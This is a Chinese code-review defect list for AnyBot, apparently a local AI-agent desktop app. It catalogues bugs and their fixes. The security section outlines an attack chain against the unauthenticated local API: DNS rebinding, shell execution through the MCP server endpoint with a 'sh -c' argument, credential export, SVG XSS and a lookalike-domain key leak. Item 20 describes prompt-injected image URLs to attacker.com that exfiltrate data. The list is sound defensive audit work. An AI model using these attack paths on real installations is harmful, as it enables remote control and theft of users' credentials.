# AnyBot 代码审查缺陷清单

> 审查时间：2026-07-21
> 审查范围:`src/`(核心运行时、Provider、频道、Web API)、`src/web/public/`(前端)、`electron/`(桌面壳)、`scripts/`、`installer/`(打包链路)、仓库提交卫生
> 总体评价：局部工程质量较高(SQL 全部参数化、路径越界有校验、Markdown 渲染经 DOMPurify、dist/ 未入库、频道/路由边界基本落实),但存在几个系统性硬伤：Web API 零鉴权、进程无异常兜底、并发守卫不统一、打包链路有卫生问题。

---

## 一、严重(安全 / 崩溃 / 数据丢失)

### 1. 整个 `/api` 零鉴权,且无 Host/Origin 校验 → 可被远程控制本机

- **位置**:`src/web/server.ts:8-20`、`src/web/api.ts:20-42`、`src/index.ts:204,246`
- **问题**:`createApp()` 直接 `app.use("/api", chatRouter())`,17 个路由全部无鉴权中间件;Express 默认不校验 `Host` 头;默认端口固定 19981。
- **影响**:只绑 `127.0.0.1` 挡不住:
  - **DNS Rebinding**:恶意网页把域名重绑定到 127.0.0.1 后与 AnyBot 同源,可读写所有 API;
  - **本机任意进程 / 同机其他用户**:无凭证即可调用。
  
  组合出的完整攻击链:
  1. **RCE** — `POST /api/mcp/servers`(`src/web/routes/mcp.ts:49-56`)提交 `{"command":"sh","args":["-c","..."]}`,`verifyStdioServer` 直接 `spawnCommand(command, args)`(`src/web/services/mcp.ts:430-435`);
  2. **窃取全部凭据** — `GET /api/data/export`(`src/web/routes/data.ts:75-92`)原样导出 `appSettings`(含各 Provider `apiKey`)和 `channelsConfig`(含飞书 `appSecret`、Telegram/微信 `token`);
  3. **窃取 Git 明文密码** — `GET /api/projects/git-credential?url=...`(`src/web/routes/projects.ts:128-136`),`getSavedGitCredentialSummary` 把明文密码放进响应(`src/web/services/projects.ts:323-328`);
  4. **冒充用户发消息** — `POST /api/send`(`src/web/routes/send.ts:9-48`)通过已登录频道对外发送;
  5. **驱动 Agent 执行任意任务** — `POST /api/sessions/:id/messages`(`src/web/routes/messages.ts:314`);
  6. **数据破坏** — `DELETE /api/data/history` 清空会话、`DELETE /api/skills/:id` 删除技能目录;
  7. **读取本机任意图片** — `GET /api/files/local-file?path=<绝对路径>`(`src/web/routes/files.ts:69-85`)只按扩展名过滤。
- **对比**:桌面更新接口反而有 Bearer 校验(`electron/main.cjs:536`),主 API 没有。
- **修复建议**:
  1. 启动时生成随机 token,Web UI 加载时注入,所有 `/api` 请求校验(可复用 `ANYBOT_DESKTOP_UPDATE_TOKEN` 模式);
  2. 校验 `Host` 头仅允许 `127.0.0.1`/`localhost`(防 DNS rebinding);
  3. 校验 `Origin`/`Sec-Fetch-Site`;
  4. `git-credential` 接口永不返回明文密码,UI 自动填充改为后端静默注入(已有 askpass 机制);
  5. `/api/data/export` 默认脱敏。
- **状态**:✅已修复(2026-08-16)

### 2. 密钥明文返回给前端

- **位置**:`src/web/routes/settings.ts:17-31`(`GET /api/app-settings`)、`src/web/routes/channels.ts:15-23`(`GET /api/channels`)、`src/web/routes/data.ts:75-92`(`GET /api/data/export`)
- **问题**:响应直接包含 `providers.*.apiKey`、频道 `appSecret`/`token` 明文。
- **影响**:任何 XSS 或浏览器扩展即可窃取;与 #1 叠加是致命的。
- **修复建议**:响应中密钥字段脱敏(只返回 `hasKey: true` 或掩码),写操作才接受完整值;导出功能加密或二次确认。
- **状态**:✅ 已修复(2026-08-16)。新增 `src/web/services/secrets.ts`:`SECRET_MASK` 掩码常量 + `maskAppSettingsSecrets`/`maskChannelsConfig`(覆盖 `providers.*.apiKey`、`codexApiKey`、anthropic/codex preset 密钥、频道 `appSecret`/`token`)+ 对应的 restore 函数(写回体中值等于掩码时还原为已存值,无已存值则删除该字段)。`GET/PUT /api/app-settings`、`GET/PUT /api/channels*` 响应统一脱敏、写入前还原;`/api/data/export` 默认脱敏,显式 `?includeSecrets=1` 才含明文,`/api/data/import` 对掩码字段还原已存值(导入脱敏导出件不会清空密钥);`fetchProviderModels`(`services/provider-models.ts`)收到掩码时按 Base URL 经 `findStoredApiKeyForBaseUrl` 换回已存密钥,前端模型列表拉取不受影响。前端密码框中掩码显示为圆点,清空字段仍可删除密钥;设置页"显示密钥"按钮(`provider-secret-toggle`)点击时经 `POST /api/app-settings/reveal-secret`(按 provider/field/presetKey 单字段、显式触发)取回明文展示,其余场景明文不出后端。

### 3. 仓库根目录存有 OpenSSH 私钥,仅靠本地 exclude 防提交

- **位置**:仓库根目录 `121212gao`(及 `121212gao.pub`)
- **问题**:`file 121212gao` 确认为 OpenSSH 私钥。未被 git 追踪,但 `.gitignore` 中**没有**对应条目,唯一保护是 `.git/info/exclude:12` 的 `/121212gao`——该文件是本地私有配置,**不随仓库分发**。
- **影响**:换机重新 clone 或其他贡献者 `git add .` 时私钥会被直接提交并推送到公共仓库;这把私钥很可能正是推送该仓库所用的部署密钥,形成自举泄露。
- **修复建议**:密钥移出仓库目录(如 `~/.ssh/`);`.gitignore` 加入 `121212gao*` 及通用私钥规则;不要依赖 `.git/info/exclude` 保护敏感文件。

### 4. 进程无 `uncaughtException`/`unhandledRejection` 兜底,且存在真实触发点

- **位置**:`src/index.ts`(全文无 `process.on`)、`electron/main.cjs`(同样没有);全仓库搜索零匹配。
- **已确认的未捕获来源**:
  - `src/channels/qqbot.ts:194` — WS 消息回调 `this.handleMessage(payload.d, t)` 是 floating promise,内部 `updateChannelConfig`(同步 `writeFileSync`)等路径抛错即 unhandledRejection → 进程退出;
  - `src/channels/qqbot.ts:170-189` — `ws.on("message")` 同步处理器对畸形 payload(如 `op=10` 缺 `d`)会同步抛 TypeError,EventEmitter 同步抛 = uncaughtException;
  - `src/channels/feishu.ts:87` — dispatcher 回调返回 promise,`handleMessage` 内 `await sendText(...)` 失败会 reject,本层无 catch。
- **叠加问题 1**:`src/logger.ts:193-201` 的 `appendFileSync` 无 try/catch,磁盘满/LOG_DIR 不可写时 logger 自身每次调用都抛错——logger 大量出现在各模块 catch 分支里,等于把已捕获异常变成新的未捕获异常。
- **叠加问题 2**:`electron/main.cjs:749-754` 后端进程退出后**不重启、不弹窗、不通知渲染进程**,桌面端变成窗口还在、API 全挂的僵尸(`backendExitMessage` 只在启动窗口内被消费)。
- **修复建议**:`src/index.ts` 顶部加进程级兜底;修掉上述三处具体来源(floating promise 加 `.catch`,WS handler 加 try/catch 并校验 payload 结构);`writeLogFile` 整体包 try/catch;Electron 运行期 exit 时带次数上限和退避自动重启,或至少弹错误框提示。
- **状态**:✅ 已修复(2026-08-16)。`src/index.ts` 注册 `uncaughtException`/`unhandledRejection` 兜底(记日志不退出);`qqbot.ts` WS 消息回调整体包 try/catch、`op=10` 校验 `heartbeat_interval`、`handleMessage` 加 `.catch`;`feishu.ts` dispatcher 回调加 `.catch`;`logger.ts` `writeLogFile` 包 try/catch 且失败告警按 60s 节流;`electron/main.cjs` 运行期后端退出后按 1s 起步指数退避(上限 30s、最多 5 次)自动重启并刷新窗口,放弃时弹错误框,主动停止(`stopBackend`)不触发重启。

### 5. 自动化调度器 delay-0 忙等自旋(CPU + 日志写盘风暴)

- **位置**:`src/automation-scheduler.ts:50-78`、`94-98`
- **问题**:长时间运行的 automation 期间,`nextRunAt` 只在 run 结束的 `finally` 里更新(`automation-runner.ts:183-185`),db 中一直是 due 状态。此时任何一次 `emitAutomationsChanged()`(用户在 UI 新建/编辑/删除任意 automation)→ `scheduleNext()` → `delay = 0` → `setTimeout(0)` → `tick()` 发现 `processing=true` → 再 `scheduleNext()` → 毫秒级频率自旋。每圈一次 SQLite 查询 + 一行 `appendFileSync` 日志,几分钟内数万行日志和持续磁盘同步写。
- **叠加问题**:tick 失败后同样无退避(`automation-scheduler.ts:64-69`),db 写入持续失败时 delay-0 无限热循环。
- **修复建议**:`processing` 为 true 时直接 return 不再 schedule;连续失败时指数退避。
- **状态**:✅ 已修复(2026-07-30)。`scheduleNext()` 在 `processing` 为 true 时直接返回(运行中的 tick 会在 finally 里统一重排);`tick()` 的 `processing` 分支不再重排;所有定时 delay 下限 1s(消除 delay-0 热循环);tick 连续失败按 5s 起步指数退避、上限 5 分钟,成功后重置。

---

## 二、中等(功能性 bug / 并发 / 资源泄漏)

### 后端并发与可靠性

#### 6. 非流式消息端点不注册 ActiveRun,会话并发守卫形同虚设

- **位置**:`src/web/routes/messages.ts:314-384`(对比流式端点 280 行有 `createActiveRun`)
- **问题**:`POST /sessions/:id/messages` 检查了 `hasActiveAgentStream(id) || hasActiveRun(id)` 但自己从不创建。后果:两个并发非流式请求可同时通过检查;非流式 run 进行时流式端点和 compact 的守卫检测不到;cancel 端点对它返回 409。并发 turn 的危害:`chat-runner.ts:458` 标题判断竞争、`session.sessionId` 互相覆盖(`chat-runner.ts:491-519`)、claude-code 并发 resume 同一 provider session、change-review 快照交叉(见 #8)。
- **修复建议**:非流式端点同样 `createActiveRun`/`clearActiveRun`(参考 `automation-runner.ts:144-159`)。

#### 7. codex 流式提前释放会话锁

- **位置**:`src/web/routes/messages.ts:291-296`
- **问题**:`codex_answer_done`(`codex.ts:905` 在 `turn.completed` 发出)时即 `releaseStream()`,但 SDK 事件流和 `runPreparedChatTurn` 收尾(change-review 收集、`db.updateSession`、`result` 事件,`chat-runner.ts:491-529`)还没做完。锁释放后用户立刻发下一条消息,会用同一 thread id `resumeThread`,而 codex CLI 的 thread 可能仍忙 → 报错或行为未定义;两个 turn 的收尾 db 写入交错。
- **修复建议**:提前释放只释放 SSE 连接(`finishAgentStream`),`clearActiveRun` 留给 run 真正结束。

#### 8. change-review 快照在并发 turn 间交叉污染

- **位置**:`src/chat-runner.ts:375` + `src/web/change-review.ts:513-540`
- **问题**:`createChangeSnapshot` 把 workdir 当前所有脏文件记为 `changedAtStart`。同一 workdir 的两个并发 turn(Web 会话 + 频道会话也可指向同一项目目录)时,turn B 写的文件会被算进 turn A 的审查单;`revertChangeReview`(`change-review.ts:700-746`)只校验内容匹配、不区分改动作者——回滚 A 会把 B 的改动一并还原。
- **修复建议**:按 workdir 串行化 turn,或在 review 中标注/过滤其他活跃 turn 声明的文件。

#### 9. 调度执行的 automation 与手动"执行一次"可并发重复运行

- **位置**:`src/automation-scheduler.ts:104-106`、`src/web/services/automation-runner.ts:94-101`
- **问题**:去重检查 `hasRunningAutomationRun` 只存在于 HTTP 路由(`routes/automations.ts:90`),调度器 tick 不检查。手动触发一个已 due 的 automation 后,调度器到点会再跑一次 → 同一任务并发执行两遍、投递两遍。
- **修复建议**:`runAutomation` 内部用 running-run 行做互斥。

#### 10. 删除会话/项目不检查 in-flight run

- **位置**:`src/web/routes/sessions.ts:177-182`、`src/web/db.ts:88,114`(FK ON)
- **问题**:删除正在跑的会话后,进行中的 turn 在 `db.addMessage`(`chat-runner.ts:389`)处抛 `SQLITE_CONSTRAINT_FOREIGNKEY`,用户看到约束错误且该轮回复丢失。删除项目(级联删会话)同理。
- **修复建议**:删除前检查 `hasActiveRun/hasActiveAgentStream`,返回 423 或先 abort。
- **状态**:✅ 已修复(2026-08-16)。`DELETE /api/sessions/:id`(`routes/sessions.ts`)先校验会话存在(404),再检查 `hasActiveRun/hasActiveAgentStream`,在跑则返回 423;`DELETE /api/projects/:id`(`routes/projects.ts`)对该项目的所有会话做同样检查,任一在跑即 423。前端删除会话(`session-controller.js`)和删除项目(`sidebar-controller.js`)均检查 `res.ok` 并展示后端返回的错误信息,423 时提示"请先停止后再删除",不再静默把会话/项目从 UI 移除。

#### 11. QQ 频道 WebSocket 断线后永久死亡

- **位置**:`src/channels/qqbot.ts:200-207`(代码里自认 `TODO: 添加断线重连逻辑`)
- **问题**:close 后实例仍挂在 `channelManager.runningChannels` 里,`/api/send` 和 automation 投递认为频道"运行中",实际消息全部发不出去。网络抖动一次就永久失效,只能人工重启频道。
- **修复建议**:参照 telegram/weixin 的 poll 循环,加带退避和 session resume(op 6)的重连。

#### 12. 微信扫码登录阻塞频道启动,stdin 验证码路径可永久挂起

- **位置**:`src/channels/weixin.ts:211`(`await this.loginWithQr()`)、`1215-1231`、`src/channels/index.ts:42`
- **问题**:未绑定时 `start()` 内同步等待扫码最长 8 分钟,期间 `startAllChannels` 卡住,`automationScheduler.start()`(`index.ts:254`)和后续频道跟着等;`readVerifyCodeFromStdin` 无超时,Electron 以 `stdio: ["ignore", ...]`(`main.cjs:740`)启动时 stdin 永远无输入 → 登录流程永久挂起。
- **修复建议**:登录流程异步化(start 先返回,登录后台进行,UI 已有轮询机制);stdin 读取加超时。

#### 13. Provider 超时无硬性兜底

- **位置**:`src/providers/codex.ts:831-834, 888`、`src/providers/claude-code.ts:434-437, 583`
- **问题**:超时只是 `abortController.abort()`,然后继续 `for await (const event of events)`。SDK 忽略 abort 时 for-await 永不结束 → turn 永久挂起,activeRun 永不释放,该会话此后所有消息 423。
- **修复建议**:`Promise.race` 加硬 deadline,强制 reject 并显式 kill 子进程。

#### 14. 无优雅退出路径

- **位置**:`src/index.ts`(无 SIGTERM/SIGINT handler)、`electron/main.cjs:939-947`(直接 `kill("SIGTERM")`)
- **问题**:进程退出时 `automationScheduler.stop()` 从不被调用;`weixin.notifyStop()` 不发出,服务端认为 bot 仍在线;正在执行的 codex/claude 子进程可能成孤儿继续烧 API 额度。
- **修复建议**:注册 SIGTERM/SIGINT → abort 活跃 run → stop channels → 退出。
- **状态**:✅ 已修复(2026-08-16)。`src/index.ts` 注册 SIGTERM/SIGINT handler 走统一 `shutdown()`:先 `abortAllActiveRuns()`(`src/web/active-runs.ts`,abort 信号沿 `RunOptions.signal` 传入 codex/claude provider 触发子进程中止)→ `automationScheduler.stop()` → `stopAllChannels()`(`src/channels/index.ts` 新增 `ChannelManager.stopAll()`,逐个 `channel.stop()`,微信会发出 `notifyStop()`)→ `closeAllConnections()` 后关闭 Web server;5 秒强制退出兜底,重复信号幂等;桌面父进程消失路径(`desktop.parent_gone`)也改走同一优雅退出。

#### 15. 登录态/凭据失效后无限重试无恢复路径

- **位置**:`src/channels/weixin.ts:382-389`(session 过期 -14 后 60s 无限重试)、`src/channels/telegram.ts:163-171`(401 后 3s 无限重试)
- **修复建议**:不可恢复错误应停轮并把频道标记为需要重新配置。

#### 16. Provider 模型拉取的域名白名单子串匹配,可被仿冒域名绕过

- **位置**:`src/web/services/provider-models.ts:30-43, 111-116`
- **问题**:`baseUrl.includes("api.deepseek.com")` 只检查子串,但请求目标用 `parsed.origin`——填 `https://api.deepseek.com.evil.com` 即可通过校验,`Authorization: Bearer <真实key>` 被发给攻击者域名。也未强制 `https:`。
- **修复建议**:精确/后缀匹配 hostname,强制 `https:`。

#### 17. 上传的 SVG 内联提供 → 存储型 XSS

- **位置**:`src/web/services/files.ts:10`(`.svg` 在 `IMAGE_EXTS`)、`src/web/routes/files.ts:53-67, 69-85`
- **问题**:上传不限类型,`.svg` 被放行,`sendFile` 返回 `image/svg+xml` 且无 `nosniff`。含 `<script>` 的 SVG 被直接打开时在 AnyBot 源上执行(配合 #1 等同 RCE)。
- **修复建议**:`.svg` 改 `Content-Disposition: attachment` 或从图片白名单移除,加 `X-Content-Type-Options: nosniff`。

#### 18. 任意网页可跨域上传文件(CSRF)

- **位置**:`src/web/routes/files.ts:48,53-67`
- **问题**:`multipart/form-data` POST 属 CORS 简单请求不触发预检,恶意网页可静默向本机上传 50MB 文件到 `tmp/uploads/`,可填充磁盘。
- **修复建议**:加 token 校验(#1 修复后自然解决);上传目录加总量配额。

### 前端

#### 19. `escapeHtml` 误用于 HTML 属性值,引号可注入属性

- **位置**:`src/web/public/scripts/app/utils/html.js:5-10`(`escapeHtml` 不转义 `"`),调用点:
  - `channels/channels-page.js:110-146` — 频道 token/secret/ownerId 插入 `value="..."`;
  - `automations/automations-page.js:653-654, 267` — 自动化名称/提示词/搜索词插入 `value="..."`;
  - `skills/skills-page.js:383` — `href="..."`(当前无实际 payload,属隐患)。
- **影响**:含 `"` 的配置值截断属性并注入新属性,最坏构成 self-XSS,至少导致表单回显损坏。
- **修复建议**:属性上下文改用同文件已有的 `escapeAttr`,或直接 `element.value = ...` 赋值。

#### 20. 模型输出中的图片 URL 无限制自动加载 — 提示注入外传通道

- **位置**:`src/web/public/scripts/app/markdown.js:42-49, 99-111`
- **问题**:模型处理的不可信内容(网页、文件、工具输出)含 `![x](https://attacker.com/c?...)` 时浏览器自动发 GET,是经典的 prompt-injection 数据外泄通道;`/` 开头路径还会自动改写为 `/api/local-file?path=...`。
- **修复建议**:默认不渲染模型输出中的外部图片(改为可点击链接),或走后端代理 + 白名单。

#### 21. 流式渲染计时器在切换会话后永久泄漏

- **位置**:`src/web/public/scripts/agent-loop.js:204-211` + `app/chat/session-controller.js:79-89` + `message-list-controller.js:241`
- **问题**:ticker 只在收到终态事件后清除;切换会话只 abort fetch,`state.status` 永远停在 `'running'`,`setInterval` 闭包永久存活。每次中途切换泄漏一个永久定时器。
- **修复建议**:消息视图增加 `dispose()`,渲染清空前统一调用。

#### 22. 图片弹窗 keydown 监听不移除

- **位置**:`src/web/public/scripts/app/ui/image-modal.js:22-35`
- **问题**:只有按 Escape 才 `removeEventListener`,点 overlay 关闭不移除,每次开关残留一个闭包。

#### 23. `loadSession` 无并发守卫,快速切换会话可错序渲染

- **位置**:`src/web/public/scripts/app/chat/session-controller.js:291-339`
- **问题**:`await fetch` 后直接赋值渲染,无请求序号/取消机制;侧边栏点击与轮询静默刷新可并发触发,慢响应后到达者覆盖快响应,出现标题与消息不匹配的错乱。
- **修复建议**:加单调递增 requestId,响应落地前校验是否最新。

#### 24. 多处 fetch 不检查响应状态,失败时 UI 静默劣化

- **位置**:
  - `session-controller.js:341-343` — `deleteSession` 不查 `res.ok`,服务端失败也本地删除;
  - `sidebar/sidebar-controller.js:1366-1375` — `fetchProjects` 不校验,接口 500 时 `projects` 变成非数组,此后 `renderProjects()` 反复抛 `forEach is not a function`,侧边栏瘫痪直到刷新;
  - `slash-items-store.js:57-58`、`channels-page.js:19-26`、`skills-page.js:36-48` 等。
- **修复建议**:统一检查 `res.ok` 和 `Array.isArray`,失败保留旧数据并提示。

#### 25. 微信登录轮询在关闭抽屉/离开频道页后仍持续

- **位置**:`src/web/public/scripts/app/channels/channels-page.js:385-391, 200-209`
- **问题**:`closeChannelDrawer` 和视图卸载不清 `weixinLoginPollTimer`,轮询无限进行,且状态变化时会把登录弹窗重新插回 `document.body`。

### 打包与工程化

#### 26. Windows 便携包/安装包包了整个 node_modules(含 250MB+ 开发依赖)

- **位置**:`scripts/package-portable.mjs:294`,产物即 `installer/windows/AnyBot.iss:7` 的打包源
- **问题**:实测 node_modules 849MB,其中 `app-builder-bin` 207MB、`electron-winstaller` 31MB、`typescript` 23MB、`electron` 15MB 等纯开发依赖全部进入 Inno 安装包;与 electron-builder 路径(只带生产依赖)产物不一致。
- **修复建议**:打包前 `npm ci --omit=dev` 生成生产依赖树再复制;长期统一为 electron-builder 一条 Windows 路径。

#### 27. Electron 35 已 EOL

- **位置**:`package.json:42`(`electron: ^35.7.5`)
- **问题**:Electron 35 于 2025-09-02 EOL,不再接收安全更新;内嵌 Chromium 134 有约一年已知漏洞未修。
- **修复建议**:升级到受支持的大版本并回归验证 Tray、autoUpdater、`ELECTRON_RUN_AS_NODE`。

#### 28. 内置 Node 运行时直接拷贝构建机的 `process.execPath`,版本不受控

- **位置**:`electron/afterPack.cjs:19`、`scripts/package-portable.mjs:50-61`
- **问题**:打包的 Node 二进制就是构建机碰巧使用的版本,无任何校验;`package.json` 无 `engines` 字段;`npmRebuild: false`(`package.json:79`)下若 Node ABI 与 better-sqlite3 预编译二进制不匹配,用户端启动即崩溃。
- **修复建议**:固定下载指定版本 Node(带校验和)或断言 `process.version`;加 `engines.node`。

#### 29. Inno Setup `CloseApplications=no` + PID 文件强杀逻辑脆弱

- **位置**:`installer/windows/AnyBot.iss:27`、`scripts/package-portable.mjs:142-148, 203-221`
- **问题**:覆盖安装时运行中的 AnyBot 持有文件锁,替换失败或产生半更新状态;Windows PID 复用会导致启动脚本误判"已运行"拒绝启动,或停止脚本强杀无关进程。
- **修复建议**:`CloseApplications=yes`;pid 校验时比对进程路径指向安装目录的 node.exe。

---

## 三、轻微(维护性 / 数据卫生)

| # | 问题 | 位置 |
|---|------|------|
| 30 | automation 每次运行新建 `source: "web"` 会话且永不清理,侧边栏和 db 无限膨胀 | `src/web/services/automation-runner.ts:42-59` |
| 31 | 媒体下载中途失败时临时目录泄漏(钉钉/微信/飞书) | `dingtalk.ts:291-301`、`weixin.ts:438-448`、`lark.ts:394-402` |
| 32 | `db.addMessage` insert 与计数更新两步写非事务,崩溃导致计数漂移 | `src/web/db.ts:666-670` |
| 33 | `webApp.listen` 无 error handler,EADDRINUSE 时以未捕获异常崩溃 | `src/index.ts:246` |
| 34 | 会话 SSE 流无心跳(全局事件流有 30s ping),长时间无 delta 可能被中间层断连 | `src/web/agent-stream.ts:364-388` |
| 35 | 取消后丢弃新 provider session id,首轮取消后 partial 上下文永久丢失 | `src/chat-runner.ts:587` |
| 36 | 钉钉/QQ 的 fetch 无超时(微信有 `fetchWithTimeout`),对端挂起时 Promise 永不 settle | `dingtalk.ts:665`、`qqbot.ts:533` |
| 37 | `providerModelCache` 无上限、过期条目只在同 key 再请求时删除 | `src/web/services/provider-models.ts:9,97-106` |
| 38 | `/api/files/local-file` 扩展名检查可被符号链接绕过 | `src/web/routes/files.ts:75-84` |
| 39 | Electron 窗口未启用 `sandbox: true`(其余 webPreferences 配置正确) | `electron/main.cjs:900-903` |
| 40 | Git 凭据明文落盘(已设 0o600,但与 #2 的明文返回形成泄漏链) | `src/web/services/projects.ts:257-268, 327` |
| 41 | 上传接口日志记录原始文件名与绝对路径 | `src/web/routes/files.ts:60` |
| 42 | 根 `AGENTS.md` 未纳入版本控制(只靠本地 exclude),工程约定对其他贡献者不可见 | `.git/info/exclude:7` |
| 43 | `.gitignore` 缺 `/tmp/`、`/outputs/`(目前靠本地 exclude 挡住用户上传附件) | `.gitignore` |
| 44 | 生产依赖 `dingtalk-stream` 使用 beta 版本 | `package.json:28` |
| 45 | `AnyBot.iss` 内置回退版本号 0.1.27 过期(当前 0.1.32),忘传 `APP_VERSION` 时产出错误版本 | `installer/windows/AnyBot.iss:3` |
| 46 | `src/web/routes/messages.ts`(387 行)含请求整形/命令推断逻辑,轻度超出路由边界,可下沉到 `services/web-chat-input.ts` | `messages.ts:45-117` |
| 47 | 前端 `attachments.js` 的 `URL.createObjectURL` 从不 revoke,长会话累积内存 | `attachments.js:84` |
| 48 | `markdown.js` 的 link renderer 内联文本未转义(靠 DOMPurify 兜底,且导致链接内格式丢失);DOMPurify 缺失时静默放行原始 HTML | `markdown.js:113-131, 51-60` |
| 49 | 设置页"网络/代理"面板完全不可达(导航无入口),整套代理 UI 是死代码 | `index.html:342`、`settings-controller.js:396-402` |
| 50 | `code-copy.js` 无降级无错误处理,非安全上下文下复制必静默失败 | `code-copy.js` |
| 51 | `settings-controller.js` 的 `sessionModelSelections` 只增不减;`fetchModelConfig` 失败时模型徽标写成字面量 `'error'` | `settings-controller.js:87, 358, 383` |

---

## 四、明确检查过、没有问题的点

- **SQL 注入**:`src/web/db.ts` 全部 60+ 条语句均为参数绑定,无拼接。
- **路径遍历**:项目目录树(`services/projects.ts:801-808`)、聊天文件引用(`web-chat-input.ts:56-66`)、change-review 快照(`change-review.ts:187-198,493,709-713`)均有正确越界校验。
- **Shell 注入(POSIX)**:`open-directory.ts` 全部数组参数 spawn;`pickProjectFolder` 的 PowerShell/AppleScript 插值正确转义。
- **Git clone 凭据**:走 askpass 临时脚本而非 URL 内嵌,错误输出有脱敏(`sanitizeGitOutput`),askpass 目录 finally 清理。
- **日志隐私**:默认不记录消息/prompt 内容,git 错误日志有凭据脱敏。
- **主消息渲染 XSS**:Markdown/diff/shell 输出统一经 DOMPurify + escapeHtml,未发现可直接利用的存储型 XSS。
- **Electron webPreferences**:`contextIsolation: true`、`nodeIntegration: false`、`setWindowOpenHandler` deny-all、`will-navigate` 拦截外部导航,均正确。
- **模块边界**:`api.ts` 保持轻量组合;频道无直接导入 providers/chat-runner,全走 `ChannelCallbacks`;dist/ 未提交,无双源真相。
- **MCP 配置校验**:`services/mcp.ts` 对 JSON 输入字段类型校验完整。

---

## 五、建议修复顺序

1. **API 鉴权 + Host/Origin 校验**(#1、#2 — 根因,修完连带收敛 #17、#18 及多处凭据暴露)
2. 私钥移出仓库 + 补 `.gitignore`(#3、#42、#43)
3. 进程级异常兜底 + Electron 后端崩溃重启 + 修 qqbot/feishu floating promise(#4)
4. 调度器自旋(#5,改动小收益大)
5. 并发守卫补齐(#6、#7、#8、#9、#10)
6. 域名白名单精确匹配(#16)+ 前端属性转义(#19)+ 模型输出图片策略(#20)
7. 打包链路统一(#26、#28、#29)+ Electron 升级(#27)
